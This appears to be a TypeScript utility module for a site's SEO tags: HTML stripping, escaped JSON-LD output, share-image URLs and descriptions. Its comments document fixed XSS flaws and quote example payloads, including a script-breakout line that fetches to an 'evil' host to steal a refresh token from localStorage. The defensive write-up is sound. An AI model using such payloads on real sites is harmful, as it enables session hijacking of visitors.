/**
 * Shared SEO primitives used by every server-side SEO builder.
 */

import { OG_IMAGE, SITE } from './config';

/**
 * C-09 route 2 — `stripHtml` RECONSTRUCTED the payload it was meant to remove.
 *
 * The old implementation stripped tag-shaped text and **then decoded `&lt;` and
 * `&gt;` back into raw angle brackets**:
 *
 *   1. `.replace(/<[^>]*>/g, ' ')`  — removes literal tags
 *   2. `.replace(/&lt;/g, '<')`     — puts them back
 *
 * Store `&lt;/script&gt;&lt;img src=x onerror=…&gt;` in a description: step 1
 * finds no literal `<` and does nothing; **step 2 reconstructs the payload**.
 * The backend sanitizer is not bypassed here — it is *irrelevant*, because the
 * stored string never contained a tag for it to sanitize.
 *
 * The decode is gone. A meta description has no need for raw angle brackets,
 * and that decode was the sole reason this route existed. `&amp;` is still
 * decoded because it cannot reconstruct a tag on its own, but it is decoded
 * LAST so a double-encoded `&amp;lt;` cannot become `&lt;` and then `<`.
 */
export function stripHtml(input?: string | null): string {
	if (!input) return '';
	return (
		input
			.replace(/<[^>]*>/g, ' ')
			.replace(/&nbsp;/g, ' ')
			.replace(/&quot;/g, '"')
			.replace(/&#39;/g, "'")
			// NOT decoded: `&lt;` / `&gt;`. See the doc comment above.
			// `&amp;` last, so `&amp;lt;` ends as `&lt;` — text, not a bracket.
			.replace(/&amp;/g, '&')
			.replace(/\s+/g, ' ')
			.trim()
	);
}

/**
 * C-09 (T-16) — the shared plain-text conversion.
 *
 * `stripHtml` is the historical name and is kept for its existing callers;
 * this is the name new code should use. Same behaviour, and additionally
 * neutralises any bracket that survives, so the result is safe to interpolate
 * into an attribute or a JSON-LD string field regardless of what was stored.
 */
export function toPlainText(input?: string | null): string {
	return stripHtml(input).replace(/[<>]/g, '');
}

/**
 * C-09 route 1 — safe serialization for a `<script type="application/ld+json">`
 * block.
 *
 * `JSON.stringify` escapes neither `<` nor `/`, so an event title of
 *
 *     </script><script>fetch('//evil/?t='+localStorage.auth_refresh_token)</script>
 *
 * broke straight out of the JSON-LD block. That block renders **server-side
 * into `<head>` on every SEO page** and no route sets `ssr = false`, so it was
 * reachable without the victim doing anything but load a public event page.
 * `sanitizeRichText` was applied to `description` and nothing else — `title`,
 * `eventOrganizerName`, `venueName`, `venueAddress`, `businessName`,
 * `fullName`, `affiliation`, `companyName`, `industry` and every child event
 * title reached `jsonLd` verbatim.
 *
 * Escaping to `\uXXXX` keeps the JSON semantically identical (a parser decodes
 * the escapes back to the original characters) while making it impossible for
 * the serialized text to terminate the enclosing element. This is the standard
 * treatment and is why it is applied to the WHOLE serialized string rather
 * than to individual fields — a per-field allow-list is what let nine fields
 * through.
 */
export function safeJsonLd(value: unknown): string {
	return JSON.stringify(value)
		.replace(/</g, '\\u003c')
		.replace(/>/g, '\\u003e')
		.replace(/&/g, '\\u0026')
		// U+2028/U+2029 are valid in JSON strings but terminate a JavaScript
		// line, which breaks the surrounding script element.
		.replace(/\u2028/g, '\\u2028')
		.replace(/\u2029/g, '\\u2029');
}

/** Truncate to `max` characters on a word boundary, without a trailing ellipsis. */
export function truncate(text: string, max: number): string {
	const t = text.trim();
	if (t.length <= max) return t;
	const cut = t.slice(0, max);
	const lastSpace = cut.lastIndexOf(' ');
	return (lastSpace > max * 0.6 ? cut.slice(0, lastSpace) : cut).trim();
}

/**
 * Resolve a usable share-image URL.
 *
 * We pass the source image through unchanged (S3, or wherever it lives) and
 * only substitute the self-hosted default when there is nothing usable. The
 * URL must be absolute and https so crawlers can fetch it.
 */
export function resolveOgImage(url?: string | null): string {
	if (!url || typeof url !== 'string') return SITE.defaultImage;
	const trimmed = url.trim();
	if (!trimmed) return SITE.defaultImage;
	// Protocol-relative or root-relative → make absolute against the site.
	if (trimmed.startsWith('//')) return `https:${trimmed}`;
	if (trimmed.startsWith('/')) return `${SITE.url}${trimmed}`;
	// Upgrade bare http to https; crawlers require secure image URLs.
	if (trimmed.startsWith('http://')) return `https://${trimmed.slice('http://'.length)}`;
	if (!trimmed.startsWith('https://')) return SITE.defaultImage;
	return trimmed;
}

/**
 * Hosts the Netlify Image CDN is allowed to fetch a share image from.
 *
 * This MIRRORS `netlify.toml`'s `[images].remote_images`, and it exists
 * because of how that allow-list fails. A transform request for a host that is
 * not listed does not fall back to the original — the Image CDN answers 400,
 * so `og:image` points at a URL that returns an error and the share card
 * renders with NO image at all. That is strictly worse than the generic
 * platform artwork, and it is invisible from our side: the tag is present and
 * well-formed, only the bytes are missing.
 *
 * So an unrecognised host degrades to the site default here, BEFORE the
 * transform is built. Anything added to `remote_images` must be added here
 * too; the two lists are checked against each other by
 * `scripts/check-og-image-hosts.mjs`.
 */
const ALLOWED_IMAGE_HOSTS: RegExp[] = [
	// S3 bucket "rondwell-project" (us-east-1), every URL style AWS emits.
	/^rondwell-project\.s3\.us-east-1\.amazonaws\.com$/i,
	/^rondwell-project\.s3\.amazonaws\.com$/i,
	/^s3\.us-east-1\.amazonaws\.com$/i,
	// Marketing artwork still served from Cloudinary.
	/^res\.cloudinary\.com$/i,
	// Any CloudFront distribution we later put in front of the bucket.
	/^[a-z0-9-]+\.cloudfront\.net$/i
];

/**
 * True when the Image CDN will actually be able to fetch this source.
 *
 * Same-origin URLs are always fine — they need no `remote_images` entry.
 * `s3.us-east-1.amazonaws.com` is path-style, so the bucket is the first path
 * segment and has to be checked there rather than in the host.
 */
export function isTransformableImageSource(url: string): boolean {
	if (url.startsWith('/')) return true;
	try {
		const u = new URL(url);
		if (u.protocol !== 'https:') return false;
		if (u.hostname.toLowerCase() === new URL(SITE.url).hostname.toLowerCase()) return true;
		if (!ALLOWED_IMAGE_HOSTS.some((re) => re.test(u.hostname))) return false;
		if (/^s3\./i.test(u.hostname)) return u.pathname.startsWith('/rondwell-project/');
		return true;
	} catch {
		return false;
	}
}

/**
 * Wrap a resolved image URL in a Netlify Image CDN transform.
 *
 * This is the single most important step for reliable WhatsApp previews, and
 * it fixes three separate failure modes at once:
 *
 *  1. **Size.** WhatsApp hard-caps share images at 600 KB and in practice
 *     starts dropping them well before that on mobile connections. Raw event
 *     artwork out of S3 routinely lands at 500-900 KB, so whether a preview
 *     appeared came down to which flyer happened to be small enough — the
 *     reason previews worked "one time" and not the next. Re-encoding to a
 *     1200x630 JPEG at q78 puts every image in the ~30-80 KB range.
 *
 *  2. **Latency.** The origin S3 objects are fetched cross-region and took
 *     ~3s. WhatsApp's crawler gives up long before a slow image finishes.
 *     Transforms are cached at Netlify's edge next to the HTML, so after the
 *     first request the image is served in milliseconds.
 *
 *  3. **Known dimensions.** Because `fit=cover` with an explicit width and
 *     height guarantees the output is exactly 1200x630, we can emit accurate
 *     og:image:width/height. WhatsApp uses those tags to pick a large preview
 *     without downloading the file first; when they are absent it has to
 *     measure the image itself, which is precisely when it times out.
 *
 * Served from our own origin, so the URL is stable, https and cacheable. The
 * transform URL is deterministic: a new source image yields a new URL, which
 * doubles as automatic cache-busting against WhatsApp's multi-day cache.
 */
export function ogImageUrl(source: string): string {
	// Already a transform (defensive — never double-wrap).
	if (source.includes('/.netlify/images')) return source;

	// A host the Image CDN will refuse produces a 400, not a fallback — so the
	// card would lose its image entirely. Substitute the site default instead.
	const usable = isTransformableImageSource(source) ? source : SITE.defaultImage;

	// Keep same-origin images as a relative source; the Image CDN resolves
	// them without needing a remote_images allowlist entry.
	const param = usable.startsWith(`${SITE.url}/`) ? usable.slice(SITE.url.length) : usable;

	const q = new URLSearchParams({
		url: param,
		w: String(OG_IMAGE.width),
		h: String(OG_IMAGE.height),
		fit: 'cover',
		position: 'center',
		fm: OG_IMAGE.format,
		q: String(OG_IMAGE.quality)
	});
	return `${SITE.url}/.netlify/images?${q.toString()}`;
}

/**
 * Derive the correct `og:image:type` MIME from a URL's file extension.
 *
 * Declaring the *true* type matters: Facebook/WhatsApp reject a share image
 * when the declared type does not match the actual bytes (e.g. claiming JPEG
 * for a PNG), which is what makes previews fall back to a generic logo.
 *
 * Returns an empty string when the type cannot be determined, in which case
 * the tag is omitted rather than guessed.
 */
export function ogImageType(url: string): string {
	// Ignore query/hash, then read the extension.
	const path = url.split(/[?#]/)[0].toLowerCase();
	const ext = path.slice(path.lastIndexOf('.') + 1);
	switch (ext) {
		case 'jpg':
		case 'jpeg':
			return 'image/jpeg';
		case 'png':
			return 'image/png';
		case 'webp':
			return 'image/webp';
		case 'gif':
			return 'image/gif';
		default:
			return '';
	}
}

/**
 * Build a neat, emoji-free social description.
 *
 * Format: "<lead sentence> -- <detail> | <detail> | <detail>"
 *   - The lead text is separated from the metadata by a double dash " -- ".
 *   - Metadata facts are separated by a pipe " | ".
 */
export function buildDescription(
	lead: string,
	facts: Array<string | false | null | undefined>,
	fallback = '',
	max = 200
): string {
	const cleanLead = truncate(stripHtml(lead), 110);
	const cleanFacts = facts.filter((f): f is string => Boolean(f && String(f).trim()));

	let out = cleanLead;
	if (cleanFacts.length) {
		const factLine = cleanFacts.join(' | ');
		out = cleanLead ? `${cleanLead} -- ${factLine}` : factLine;
	}

	out = out.trim();
	if (!out) out = fallback;
	return truncate(out, max);
}

/** Absolute canonical URL for a given path (path should start with "/"). */
export function canonical(path: string): string {
	return `${SITE.url}${path.startsWith('/') ? path : `/${path}`}`;
}
